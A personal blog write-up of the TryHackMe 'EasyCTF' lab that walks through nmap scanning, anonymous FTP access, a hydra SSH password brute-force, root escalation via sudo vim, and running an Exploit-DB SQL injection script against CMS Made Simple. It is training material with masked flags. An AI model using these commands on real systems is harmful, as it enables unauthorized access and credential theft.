---
title: "EasyCTF_writeup.sh"
date: 2020-08-21T14:37:34-04:00
draft: false
toc: false
images:
cover: "img/easyCTF_cover.png"
tags:
  - hacking
  - tryHackme
  - writeups
---

## THM - EasyCTF/SimpleCTF Writeup

Welcome to my second write-up for a TryHackme machine, in this case we'll be solving **EasyCTF** or should I say **SimpleCTF** It seems to be called as both by looking at the room name and URL. Anyways, I invite you to try out this room on TryHackme by following the link below.

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/easyctf).
- **PLEASE NOTE:** Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.


> Question #1: How many services are running under port 1000?

First let's fire up a **Nmap** scan to see if we can identify any services, making sure we skip the initial ping **[-Pn]**, scan all ports **[-p-]**:

```bash
┌──(tzero86㉿tzbox)-[~/Documents/THM/easyCTF]
└─$ sudo nmap -A -Pn -p- -T4  10.10.251.248
[sudo] password for tzero86: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 20:06 EDT
Nmap scan report for 10.10.251.248
Host is up (0.35s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system    (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), L  inux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera ( Linux 2.6.17) (87%), Linux 2.6.32 (86%), Infomir MAG-250 set-top box (86%)      
No exact OS matches for host (test conditions non-ideal).                       
Network Distance: 4 hops                                                        
Service Info: OS: Unix

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   234.68 ms 10.13.0.1
2   ... 3
4   376.88 ms 10.10.251.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 540.83 seconds
```
With this scan we now we have two services running (under port 1000): 
```bash
[1] 21 - vsFTPd 3.0.3
[2] 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Our extended scan with **autorecon** was returned SSH on port 2222 as well:

```bash
┌──(tzero86㉿tzbox)-[~/Documents/THM/easyCTF]
└─$ autorecon 10.10.251.248                                                1 
[*] Scanning target 10.10.251.248
[*] Running service detection nmap-top-20-udp on 10.10.251.248
[*] Running service detection nmap-quick on 10.10.251.248
[*] Running service detection nmap-full-tcp on 10.10.251.248
[*] [20:10:28] - There are 2 tasks still running on 10.10.251.248
[*] Service detection nmap-quick on 10.10.251.248 finished successfully in 1 minute, 1 second
[*] Found ftp on tcp/21 on target 10.10.251.248
[*] Found http on tcp/80 on target 10.10.251.248
[*] Found ssh on tcp/2222 on target 10.10.251.248
```
And with this scan we can answer the second question.

> Question #2: What is running on the higher port?


Let's move on to the next one.

> Question #3: What's the CVE you're using against the application?

So we need to look for a vulnerability to exploit. Let's see if we can find anything related to **vsFTPd 3.0.3** or related to **Apache HTTPd 2.4.18**.


The first thing we know about the FTP service running on port 21 is that it has anonymous access enabled. So let's connect to it and maybe download all the files if there is anything interesting that can aid us.

```bash
┌──(tzero86㉿tzbox)-[~]
└─$ ftp  10.10.251.248 21                                            
Connected to 10.10.251.248.
220 (vsFTPd 3.0.3)
Name (10.10.251.248:tzero86): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
```

As we can see there is a potentially interesting file called **ForMitch.txt**, which at the very least already gives us one username to try on the SSH port.

Let's download the file from the FTP, we can use this command to download all files directly:


```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```

```bash
┌──(tzero86㉿tzbox)-[~/Documents/THM/easyCTF/FTPFiles]
└─$ wget -m --no-passive ftp://anonymous:anonymous@10.10.251.248                         
--2020-08-20 20:39:42--  ftp://anonymous:*password*@10.10.251.248/
=> ‘10.10.251.248/.listing’
Connecting to 10.10.251.248:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.
10.10.251.248/.listing      [ <=>                           ]     180  --.-KB/s    in 0s      
2020-08-20 20:39:46 (33.6 MB/s) - ‘10.10.251.248/.listing’ saved [180]
--2020-08-20 20:39:46--  ftp://anonymous:*password*@10.10.251.248/pub/
=> ‘10.10.251.248/pub/.listing’
==> CWD (1) /pub ... done.
==> PORT ... done.    ==> LIST ... done.

10.10.251.248/pub/.list     [ <=>                           ]     189  --.-KB/s    in 0s      

2020-08-20 20:39:48 (39.3 MB/s) - ‘10.10.251.248/pub/.listing’ saved [189]

--2020-08-20 20:39:48--  ftp://anonymous:*password*@10.10.251.248/pub/ForMitch.txt
           => ‘10.10.251.248/pub/ForMitch.txt’
==> CWD not required.
==> PORT ... done.    ==> RETR ForMitch.txt ... done.
Length: 166

10.10.251.248/pub/ForMi 100%[==============================>]     166  --.-KB/s    in 0s      

2020-08-20 20:39:49 (345 KB/s) - ‘10.10.251.248/pub/ForMitch.txt’ saved [166]

FINISHED --2020-08-20 20:39:49--
Total wall clock time: 7.1s
Downloaded: 3 files, 535 in 0s (1.06 MB/s)

``` 

When we open the file we get another bit of information, Mitch seems to have a very bad habit of using weak passwords.

```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```
So lets attempt to crack it, shall we? Since we know **mitch** is probably a valid username, let's try to crack the SSH login with **hydra**.

```bash
┌──(tzero86㉿tzbox)-[~/Documents/THM/easyCTF]
└─$ hydra -l mitch -P "/usr/share/seclists/Passwords/Common-Credentials/best110.txt" -e nsr -s 2222 -o "/home/kali/Documents/THM/easyCTF/results/10.10.251.248/scans/tcp_2222_ssh_hydra.txt" ssh://10.10.49.87
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-21 13:04:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 113 login tries (l:1/p:113), ~8 tries per task
[DATA] attacking ssh://10.10.49.87:2222/
[2222][ssh] host: 10.10.49.87   login: mitch   password: ******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-21 13:05:22
```
There we go, we have a user and pass to connect to SSH. With this we can answer the following room questions:

> Question #5 What's the password?

> Question #6 Where can you login with the details obtained?

Let's check the SSH login out:

```bash
┌──(tzero86㉿tzbox)-[~/Documents/THM/easyCTF]
└─$ ssh mitch@10.10.49.87 -p 2222                                                                                              255 ⨯
The authenticity of host '[10.10.49.87]:2222 ([10.10.49.87]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.49.87]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.49.87's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
{User_flag_value_here}
$ cd ..
$ ls
mitch  sunbath
$ 
```
Let's review where we are at. We managed to get into the FTP server with anonymous login, we download a file for Mitch and got information that he uses bad insecure passwords. We then used Hydra to brute force the password and got the SSH password. We logged into SSH as Mitch and found out the user.txt value. We also know from looking a bit on the SSH, there is another username **sunbath**.

With this we can answer some questions from the room already. Still no idea what CVE we should be using for Question 2. But we can answer the following:

> Question #7: What's the user flag?

> Question #8: Is there any other user in the home directory? What's its name?

The next question ask us if we can use anything to leverage root privileges, let's check in the current SSH session if our user **mitch** has any access:

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

This let us answer question 9:

> Question #9: What can you leverage to spawn a privileged shell?


We now know Mitch can run **vim** as root. Once inside vim we press **ESC** then type in **:!bash** and press enter, just follow my steps and shown below:

![Priv Esc with vim running as sudo](/img/Vim_Exploit_Sudo.gif)

After that we can just review a bit to see what we find. From the room's question we know we need to locate the root flag. So let's browse to the root folder and see if it is there:

```bash
root@Machine:/root# ls
root.txt
root@Machine:/root# cat root.txt
{The_Root_Flag_Value_here}
root@Machine:/root# 
```

Having found a way to get root access, we can now answer the question 10.

> Question #10: What's the root flag?


But we are still missing the CVE number answer to question #3 and also the answer to question #4. It seems we need to find some additional information. These are the questions still pending:

> Question #3: What's the CVE you're using against the application? 

> Question #4: To what kind of vulnerability is the application vulnerable?


Maybe we missed something but we surely forgot to run a **gobuster** scan. Let's do that now:

```bash
┌──(tzero86㉿tzbox)-[~]
└─$ gobuster dir -u http://10.10.49.87/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.49.87/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/21 14:48:02 Starting gobuster
===============================================================
/simple (Status: 301)

```
This will take some time. Let's see what's that **/simple** directory about.

![We get a Simple CMS welcome page](https://imgur.com/IjeZ6cvl.png)

So we have a Simple CMS running on the machine and we even get pointed to **/simple/admin/** to log in.

![We get an admin login panel](https://imgur.com/mZDKOlYl.png)

Let's see if we can find any CVE for this CMS.

Looking on Exploit-DB we get an SQL injection CVE:

![CVE for this CMS](https://i.imgur.com/evabUPI.png)

Let's download this python exploit file and see what it does. In this case I renamed the exploit as **exploit.py**

First we need to make this file executable and then we can run our exploit. Also note that this script runs with **python2** and not with **python3**.

```bash
┌──(tzero86㉿tzbox)-[~/Documents/THM/easyCTF]
└─$ python exploit.py --u http://10.10.49.87/simple/ --crack -w /usr/share/wordlists/rockyou.txt

```

This script is very unreliable, it crashes a lot. In the end we should see something like this:

```bash
[*] Try: 1di
[*] Try: 1do
[+] Salt for password found: *************
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: ***********************
[+] Password cracked: ******
```

With that we are able to fully answer all questions for the room and we saw how to get the flags. I believe running **gobuster** right along with **Nmap** was the right way to go. In that case dealing with this script and cracking the password for the CMS would have given us the password for the SSH connection. Anyways, there could be other ways to go about this box. This was mine.

As usual, happy hacking.

{{< thm_badge >}}
